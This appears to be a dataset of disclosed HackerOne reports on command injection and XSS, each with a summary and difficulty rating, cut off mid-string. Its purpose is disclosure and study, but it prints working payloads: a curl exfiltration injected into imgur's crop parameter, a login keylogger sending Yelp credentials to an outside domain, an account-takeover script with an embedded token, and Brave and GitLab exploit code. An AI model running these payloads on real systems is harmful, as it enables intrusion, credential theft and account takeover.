INJECTIONS HARD
==================================================

Total reports analyzed: 36

Command Injection - Generic Vulnerabilities (4 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1274695: RCE of Burp  Scanner / Crawler via Clickjacking 
================================================================================
RAW DESCRIPTION:

Burp Suite utilizes an embedded Chrome browser for crawling and scanning web applications. The Chrome instance is launched in headless mode, with remote debugging enabled via the remote-debugging websocket port instead of remote-debugging-pipe. As a result, a known XSS vulnerability in Chrome can be leveraged in combination with a JavaScript port sniffing and ClickJacking attack to compromise the WebSocket GUID for the remote debugging channel. Using the provided remote debugging APIs, it’s possible to trigger a file download to the /Applications/Burp Suite Professional.app/Contents/ directory with a new user.vmoptions file. This will provide the -Xmx5m and -XX:OnOutOfMemoryError=open -a Calculator flags to JVM the next time that Burp Suite is launched. Accordingly, Burp Suite will quickly exhaust the available JVM memory and trigger the supplied OS command.
Based on Google’s security impact guidelines, this issue would typically be considered to have no security impact since Chrome requires additional flags to run (--remote-debugging and --headless) [1]. Additionally, the XSS vector used in this PoC has been public to Chrome since at least 2016 and reported in multiple tickets [2-6]. As a result, we are reporting this as a Burp Suite vulnerability since the named pipe transport could be utilized to mitigate this issue, which is supported by tools like puppeteer (e.g. --remote-debugging-pipe) [7].
POC:
See attached video.
Steps to reproduce:
To confirm this issue, perform the following steps:
Download the attached ‘burp.html’ exploit, and host it on a web server (e.g. python -m http.server)
Launch an instance of Burp Suite, and start a new scan of the web server.
Open a Chrome browser and navigate to the hosted exploit page (e.g. http://127.0.0.1:8000/burp.html)
Observe that a JavaScript port scanner is determining the randomized port listening for Chrome remote debugging. After the port is identified, a clickjacking payload will be rendered on the page.
After clicking the ‘CLICK ME!!!’ button, restart Burp Suite and observe that the Calculator app has been launched.
References:
[1] https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/security-labels.md#TOC-Security_Impact-None
[2] https://bugs.chromium.org/p/chromium/issues/detail?id=607939
[3] https://bugs.chromium.org/p/chromium/issues/detail?id=618333
[4] https://bugs.chromium.org/p/chromium/issues/detail?id=619414
[5] https://bugs.chromium.org/p/chromium/issues/detail?id=775527
[6] https://bugs.chromium.org/p/chromium/issues/detail?id=798163
[7] https://github.com/puppeteer/puppeteer/blob/943477cc1eb4b129870142873b3554737d5ef252/src/node/PipeTransport.ts
Impact
After successful exploitation an attacker can gain control over victim's computer with the same permissions as the user running the scanner.



================================================================================
Vulnerability Description:
Burp Suite's embedded Chrome browser, used for crawling and scanning, is vulnerable to a combination of XSS, port sniffing, and ClickJacking attacks. This allows an attacker to compromise the WebSocket GUID for the remote debugging channel, manipulate the JVM settings, and execute arbitrary commands with the same permissions as the user running Burp Suite.

Steps to Reproduce:
1. Download the attached ‘burp.html’ exploit and host it on a web server (e.g., python -m http.server)
2. Launch an instance of Burp Suite and start a new scan of the web server
3. Open a Chrome browser and navigate to the hosted exploit page (e.g., http://127.0.0.1:8000/burp.html)
4. Observe that a JavaScript port scanner is determining the randomized port listening for Chrome remote debugging
5. After the port is identified, a clickjacking payload will be rendered on the page
6. Click the ‘CLICK ME!!!’ button, restart Burp Suite, and observe that the Calculator app has been launched
Exploitation Difficulty:
The attack involves multiple components (XSS, port sniffing, ClickJacking, remote debugging API manipulation) and requires understanding subtle interactions between these components. Additionally, the attacker must manipulate complex application states (e.g., WebSocket GUID, JVM settings) and use novel logic not commonly found in other applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/187542: Brave Browser unexpectedly allows to send arbitrary IPC messages
================================================================================
RAW DESCRIPTION:

Summary:
I found that Brave Browser allows to overwrite the internal js code from the user js code.
Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on.
Steps to Reproduce:
1 . An attacker overwrites Function.prototype.call, like this:
Code 196 Bytes
1Function.prototype.call=function(e){
2    if(e[0]&&e[0]=="window-alert"){
3        e[0]="[ARBITRARY_IPC_MESSAGE_HERE]";
4        e[1]="[ARBITRARY_IPC_MESSAGE_HERE]";
5    }
6    return this.apply(e);
7}
2 . An attacker calls alert().
3 . Brave's alert() function calls Function.prototype.call in the internal code. At this time, the overwritten Function.prototype.call is used in the alert internal code.
4 . Function.prototype.call receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.
PoC:
I'd like to show three PoCs:
UXSS PoC
(If it goes well, you can see an alert dialog on google's domain.)
Code 666 Bytes
1<script>
2Function.prototype.call=function(e){
3    if(e[0]&&e[0]=="window-alert"){
4        e[0]="dispatch-action";
5        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://www.google.com/ncr"},"openInForeground":true}'
6    }
7    return this.apply(e);
8}
9alert();
10
11setTimeout(function(){
12	for(var windowKey=0;windowKey<10000;windowKey++){
13		Function.prototype.call=function(e){
14			if(e && e[0] && e[0]=="window-alert"){
15				e[0]="dispatch-action";
16				e[1]=`{"actionType":"window-set-url","location":"javascript:alert('document.domain is: '+document.domain)","key":${windowKey}}`
17			}
18			return this.apply(e);
19		}
20		alert();
21	}
22},3000);
23</script>
Address Bar Spoofing PoC
(If it goes well, you can see https://www.google.com/ in address bar.)
Code 246 Bytes
1<script>
2Function.prototype.call=function(e){
3	if(e && e[0] && e[0]=="window-alert"){
4		e[0]="dispatch-action";
5		e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/"}';
6	}
7	return this.apply(e);
8}
9alert();
10</script>
Change browser settings PoC
(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in about:preferences. )
Code 281 Bytes
1<script>
2Function.prototype.call=function(e){
3    if(e[0]&&e[0]=="window-alert"){
4        e[0]="dispatch-action";
5        e[1]='{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}'
6    }
7    return this.apply(e);
8}
9alert();
10</script>
FYI, Electron has similar issues. I reported it to Electron team and they are working on it.
Could you confirm this bug?
Thanks!



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to overwrite internal JavaScript functions in Brave Browser, specifically Function.prototype.call, to intercept and modify IPC messages. This can lead to UXSS, address bar spoofing, and changing browser settings by sending arbitrary IPC messages.

Steps to Reproduce:
1. An attacker overwrites Function.prototype.call to intercept and modify IPC messages
2. The attacker calls alert(), which triggers the modified Function.prototype.call to send arbitrary IPC messages
Exploitation Difficulty:
The attack requires understanding of JavaScript prototype manipulation and IPC message handling in Brave Browser. The interaction between overwriting Function.prototype.call and the internal use of this function in alert() is subtle and non-obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/188561: Sending arbitrary IPC messages via overriding Array.prototype.push
================================================================================
RAW DESCRIPTION:

Summary:
This bug is similar to #187542 and #188086.
I found that also Array.prototype.push is exploitable.
Tested on:
Brave 0.12.12
Steps To Reproduce:
Go to this page: https://vulnerabledoma.in/brave/settings_change3.html
Code 247 Bytes
1<script>
2Array.prototype.push=function(e){
3	this[0]=function(e,f){
4		e.sender.send("dispatch-action",'{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}');
5	}
6}
7</script>
8
9<embed src=".swf"></embed>
See about:preferences. You can confirm that your home page is changed to http://attacker.example.com/.
Also an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .
Technical Details
This push in the event_emitter.js is overwritten:
Code 197 Bytes
1EventEmitter2.prototype.on = function (event, fn) {
2  this._callbacks = this._callbacks || {};
3  (this._callbacks['$' + event] = this._callbacks['$' + event] || [])
4    .push(fn);
5  return this;
6};
Could you confirm this bug?
Thanks!



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to execute arbitrary IPC messages by overriding the Array.prototype.push method. When the method is overridden, it can be used to send malicious messages that change browser settings, such as the homepage, leading to potential UXSS and address bar spoofing.

Steps to Reproduce:
1. Navigate to the vulnerable page: https://vulnerabledoma.in/brave/settings_change3.html
2. Execute the provided script to override Array.prototype.push, which triggers the vulnerability when the embed element is loaded
3. Check about:preferences to confirm the homepage has been changed to http://attacker.example.com/
Exploitation Difficulty:
The attack requires understanding and manipulating JavaScript's prototype inheritance and the specific way the Brave browser handles IPC messages. The interaction between the overridden push method and the browser's internal event handling is subtle and non-obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/212696: RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`
================================================================================
RAW DESCRIPTION:

Summary
The y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.
Reproduction steps
Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.
Login into your imgur account and upload an image.
Move your mouse over the image, click on the tiny button with pencil on it, then click "Edit".
Select a random rectangle on the image, then click "Apply".
In the burp suite, you will see a request to an URL like this: http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510
Change the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-.
The full URL after the change must look like http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303, note that you have to change <your-server> to a webserver under your control).
Fire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body. You can replace ps aux with another command (but you have to write ${IFS} instead of spaces).
Detailed description
I was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of y GET parameter) goes into a shell command. While all special characters (like |, $ and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is escapeshellcmd PHP function, but that can also be some kind of custom input filtering/processing.
The rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by "Crop/Resize" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended -rotate 90 to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably gm convert utility). I read the documentation and found that -write argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.
Mitigation
Probably either some kind of custom processing or escapeshellcmd function is used to construct the command line. In both cases, replace it with applying escapeshellarg to individual arguments. In the second case, you probably want to run grep -R escapeshellcmd <path to the source code> to find more vulns :-)



================================================================================
Vulnerability Description:
The y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.

Steps to Reproduce:
1. Login into your imgur account and upload an image.
2. Move your mouse over the image, click on the tiny button with pencil on it, then click 'Edit'.
3. Select a random rectangle on the image, then click 'Apply'.
4. In the burp suite, you will see a request to an URL like this: http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510
5. Change the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-.
6. Fire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body.
Exploitation Difficulty:
This vulnerability involves understanding the behavior of GraphicsMagick's -write option and how it processes filenames starting with a pipe. The attacker needs to know about command-line argument injection and how to manipulate the y parameter to inject additional arguments. The interaction between the y parameter and the GraphicsMagick utility is non-obvious and requires specific knowledge of GraphicsMagick's behavior.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Generic Vulnerabilities (6 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1438028: XSS on internal: privileged origin through reader mode
================================================================================
RAW DESCRIPTION:

Summary:
Brave iOS has two weaknesses described below. By combining them, XSS can be achieved on the privileged origin internal://local.
Exposure of uuidKey through REFERER header
Reader mode in Brave has two HTML templates, Reader.html and ReaderViewLoading.html. The former template defines <meta name="referrer" content="never"> header for preventing referrer leakage, but the latter template does not. Therefore, by opening an external page through ReaderViewLoading.html, the uuidKey contained in the Reader mode page URL is leaked.
XSS in SessionRestoreHandler
SessionRestoreHandler is used to restore a previously used tab, but it does not validate an URL to be restored. Therefore, if a javascript: URL is provided, the code is executed on the internal: domain.
Note that the first vulnerability is not reproduced on iOS 15 because WKWebView's referrer policy has been changed to hostname only. However, according to Apple's report in June 2021, more than 90% of users were using iOS 14.
Products affected:
Brave iOS 1.32.3 and higher (include the latest Nightly) on iOS 14.x and below
Steps To Reproduce:
Visit https://csrf.jp/brave/reader_uuid_leakage.php
Open the page in Reader mode
Long tap a hyperlink in the page and choose "Open in New Private Tab"
Wait for several seconds and tap "Load original page"
uuidKey in the reader mode URL is stolen through REFERER header
Click an exploit URL in the page, then XSS is triggered on internal://local
Supporting Material/References:
xss_on_internal_origin_through_reader_mode.mov: video of the attack against the vulnerabilities
reader_uuid_leakage.php: server-side exploit code
Impact
Attacker can elevate privileges to internal: origin



================================================================================
Vulnerability Description:
The vulnerability involves two weaknesses in Brave iOS: exposure of uuidKey through the REFERER header due to missing referrer policy in ReaderViewLoading.html, and XSS in SessionRestoreHandler which does not validate URLs to be restored. Combining these allows XSS on the privileged internal://local origin.

Steps to Reproduce:
1. Visit https://csrf.jp/brave/reader_uuid_leakage.php
2. Open the page in Reader mode
3. Long tap a hyperlink in the page and choose "Open in New Private Tab"
4. Wait for several seconds and tap "Load original page"
5. uuidKey in the reader mode URL is stolen through REFERER header
6. Click an exploit URL in the page, then XSS is triggered on internal://local
Exploitation Difficulty:
The attack requires understanding and combining two distinct vulnerabilities: one related to referrer leakage and another to improper URL validation. The interaction between these components is non-obvious, and the attack involves manipulating the application state through reader mode and session restoration.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1579645: XSS: `v-safe-html` is not safe enough
================================================================================
RAW DESCRIPTION:

v-safe-html directive uses Dompurify to remove data-remote', 'data-url', 'data-type', 'data-method' attributes from HTML tags. Rails-js relies on another attribute, data-disable-with to show a HTML content when an user clicks on a disabled link.
For example, the following text will bypass the sanitization and popup an alert when an user clicks on the link (which is a transparent topmost layer since the sanitization allows also style and class attributes):
Code 146 Bytes
1<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
An exploitation can be done via jobs' error messages which contain CI job names which are provided by users.
Steps to reproduce
In an existing project or create a new one, add .gitlab.ci file with the following content:
Code 924 Bytes
1'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
2  stage: build
3  script: echo "hi"
4
5'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
6  stage: build
7  script: echo "hi"
8
9trigger-xss:
10  stage: test
11  script: echo "hi"
12  dependencies:
13    - '1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
14    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>'
Go to CI/CD/Jobs tab and wait for the CI jobs finished
If you are testing on a local instance without CSP protection, click on detail of the job 1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">, then click on the trash button on the right literal bar to Erase job logs and artifacts.
Go back to the job list, click on trigger-xss link to view the detail of this job. Then click on Retry button on the right literal bar to retry the job.
An error message appears: This job could not start because it could not retrieve the needed artifacts: 1. XSS when no CSP. Click anywher to trigger the alert
Note: on gitlab.com or an instance having CSP protection (with strict-dynamic value of script-src), the inline script, such as onerror or the <iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>, will be prevented to trigger. In such a case, we may use <form> tag to trigger arbitrary API requests on behalf of the user, for example, this allows escalate to admin permission when administrator click anywhere 2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>
Impact
XSS allow attackers to perform arbitrary actions on behalf of victims at client side.
Examples
https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498306483
https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498287882
Output of checks
This bug happens on GitLab.com
Impact
XSS allow attackers to perform arbitrary actions on behalf of victims at client side.



================================================================================
Vulnerability Description:
The vulnerability is an XSS flaw in GitLab's job error message handling where the v-safe-html directive fails to properly sanitize the data-disable-with attribute, allowing JavaScript execution when users interact with certain UI elements. The attack can be delivered through specially crafted CI job names and can lead to arbitrary actions on behalf of victims.

Steps to Reproduce:
1. Create a .gitlab.ci file with malicious job names containing XSS payloads in the data-disable-with attribute
2. Trigger the CI jobs, then interact with the job interface to trigger the XSS payload when viewing error messages
Exploitation Difficulty:
This vulnerability requires understanding of multiple components: GitLab CI job naming, the v-safe-html directive's sanitization behavior, Rails-js's handling of data-disable-with attributes, and the specific UI interaction flow that triggers the XSS. The attack involves subtle interactions between these components and requires crafting a payload that bypasses the sanitizer while being triggered through a non-obvious UI interaction path.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2010530: yelp.com XSS ATO (via login keylogger, link Google account)
================================================================================
RAW DESCRIPTION:

Summary:
yelp.com reflects the content of the cookie guvo in the html returned to the user. In some cases this value is not properly escaped, leading to XSS. This can be combined with another issue where the backend does not properly parse the user supplied cookies and allows us to smuggle a guvo cookie inside a cookie named yelpmainpaastacanary. The yelpmainpaastacanary cookie can be set by including a URL query parameter ?canary=[Cookie value] in any request to *.yelp.com.
This report shows how chaining this cookie XSS with a cookie parsing issue leads to persistent XSS in a victims browser. To demonstrate impact I'll show how this can be used to inject a keylogger on https://biz.yelp.com/login to steal email/password of a business account, as well as how it's possible to link an attackers Google account to a victims Yelp account, and gain access to the victims account via "Sign in with Google".
Description
XSS via "guvo" cookie
The value of the cookie guvo is reflected (unescaped) on some pages. Most interestingly on the frontpage of www.yelp.com and on the login page of https://biz.yelp.com/login. The unescaped reflection happens in the window.ySitRepParams object and the window.yelp.guv property. This can be seen by simply adding the cookie to the request in a browser or Burp, and observe the response:
██████████
█████████
Setting the "yelpmainpaastacanary" cookie
There is a feature on yelp.com where by adding the query parameter ?canary=asdf to a request, the response will contain an HTTP header:
Code 85 Bytes
1Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
This gives us a way to set the cookie yelpmainpaastacanary to any value we want. But we need a way to control the guvo cookie. It turns out that we can smuggle the guvo cookie inside the yelpmainpaastacanary cookie.
Broken cookie parsing and cookie smuggeling
The Yelp backend will parse the users cookies by splitting them by spaces instead of semicolons. Normally cookies sent by the browser will be separated by semicolons like
Code 17 Bytes
1Cookie: a=1; b=2;
which should be parsed as 2 cookies a and b. But if we set a cookie like:
Code 16 Bytes
1Cookie: a=1 b=2;
This should be parsed as 1 cookie a with the value "1 b=2", but Yelp will parse it as 2 cookies a and b. We can abuse this to smuggle the guvo cookie inside the yelpmainpaastacanary cookie by making a request to
Code 97 Bytes
1https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
████
which sets the cookie
Code 113 Bytes
1Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; 
<image_0>
As an added bonus we can also inject a Max-Age: 99999999 attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:
Code 123 Bytes
1https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
Code 143 Bytes
1Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
POCs
Please note: Since I'm in Denmark yelp.com will redirect to yelp.dk. The attacks work exactly the same on both domains.
Keylogger on biz.yelp.com/login
This javascript snippet will leak the content of the email and password fields on https://biz.yelp.com/login when the user types, or when the login form is submitted. The credentials are leaked to the domain calc.sh which I own:
Code 328 Bytes
1setTimeout(function () {
2  a = document.getElementsByName('password')[0];
3  b = document.getElementsByName('email')[0];
4  function f() {
5    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
6  }
7  a.form.onclick=f;
8  a.onchange=f;
9  b.onchange=f;
10  a.oninput=f;
11  b.oninput=f;
12}, 1000)
We create a link that will set the guvo cookie to fire this payload on the login page. See this CyberChef recipe for how it's done and to easily make modifications:
Code 889 Bytes
1https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ
Our final link looks like this:
Code 509 Bytes
1https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
Anyone visiting that link will have our keylogger installed. Here's a short video showing it in action:
███
Account takeover by linking a Google account
The request to link a Google account to a Yelp account is done from https://yelp.com/profile_sharing. The final request in the Google-link-flow is a POST request to https://www.yelp.dk/google_connect/register with CSRF token csrftok and a token id_token which is the token liking a Google account to the Yelp account. We can generate a token for our own Google account, and then use the XSS to link it to a victims account.
To generate a token we simply link a Google account to our own Yelp account and intercept the final request in Burp:
████████
Now that we have a token for the Google accoutn ██████ we can create an XSS payload for a victim. In this code we make a request to /profile_sharing and extract the csrf token with a reqular expression. We then make the request to link our Google account to the victims account using the id_token we prepared:
Code 1.54 KiB
1(function f() {
2  a = new XMLHttpRequest();
3  a.addEventListener('load', function () {
4    rx = /"GoogleConnect": "([^"]*)/;
5    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg";
6    b = rx.exec(this.responseText);
7    fetch("https://www.yelp.dk/google_connect/register", {"method": "POST", "body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})})
8  });
9  a.open('GET', 'https://www.yelp.dk/profile_sharing');
10  a.send();
11})();
Again, we use this cyberchef recipe to create a link that infects the victim:
Code 2.50 KiB
1https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=KGZ1bmN0aW9uIGYoKSB7CiAgYSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIGEuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uICgpIHsKICAgIHJ4ID0gLyJHb29nbGVDb25uZWN0IjogIihbXiJdKikvOwogICAgaWRfdG9rZW4gPSAiZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqWXdPRE5rWkRVNU9ERTJOek5tTmpZeFptUmxPV1JoWlRZME5tSTJaakF6T0RCaE1ERTBOV01pTENKMGVYQWlPaUpLVjFRaWZRLmV5SnBjM01pT2lKb2RIUndjem92TDJGalkyOTFiblJ6TG1kdmIyZHNaUzVqYjIwaUxDSnVZbVlpT2pFMk9EVTNNVEF4TmpFc0ltRjFaQ0k2SWpZNU9UWTVNVGc1TlRjeE1TMTJiVEpyT0dWbllqTXlOMmh4TTJ3d1lUZGpjbk5xTUc4eWJ6bHNaVzQyTVM1aGNIQnpMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlNJc0luTjFZaUk2SWpFd05EQTBNVEExTXpreU1qUTVORFkzTWpFeE55SXNJbVZ0WVdsc0lqb2laRzl2WkdGa2RXZDFZMEJuYldGcGJDNWpiMjBpTENKbGJXRnBiRjkyWlhKcFptbGxaQ0k2ZEhKMVpTd2lZWHB3SWpvaU5qazVOamt4T0RrMU56RXhMWFp0TW1zNFpXZGlNekkzYUhFemJEQmhOMk55YzJvd2J6SnZPV3hsYmpZeExtRndjSE11WjI5dloyeGxkWE5sY21OdmJuUmxiblF1WTI5dElpd2libUZ0WlNJNklrUmhaR1VnVFhWeWNHaDVJaXdpY0dsamRIVnlaU0k2SW1oMGRIQnpPaTh2YkdnekxtZHZiMmRzWlhWelpYSmpiMjUwWlc1MExtTnZiUzloTDBGQlkwaFVkR1pHVmxSRlNVNWZjM1ZWVjAxQ1RtcGpTR0ZFV0hnM1RESmxiSEZRTVRWd05HaExha3N4UFhNNU5pMWpJaXdpWjJsMlpXNWZibUZ0WlNJNklrUmhaR1VpTENKbVlXMXBiSGxmYm1GdFpTSTZJazExY25Cb2VTSXNJbWxoZENJNk1UWTROVGN4TURRMk1Td2laWGh3SWpveE5qZzFOekUwTURZeExDSnFkR2tpT2lKbU56WXlaRFpsWmpFeVptRmtOakk1WW1FNFlUWTVPR0ZoTUROaE1HTTNOelU0TXpZd1lXVXhJbjAuSy1YY2FBQlZoVXYtV2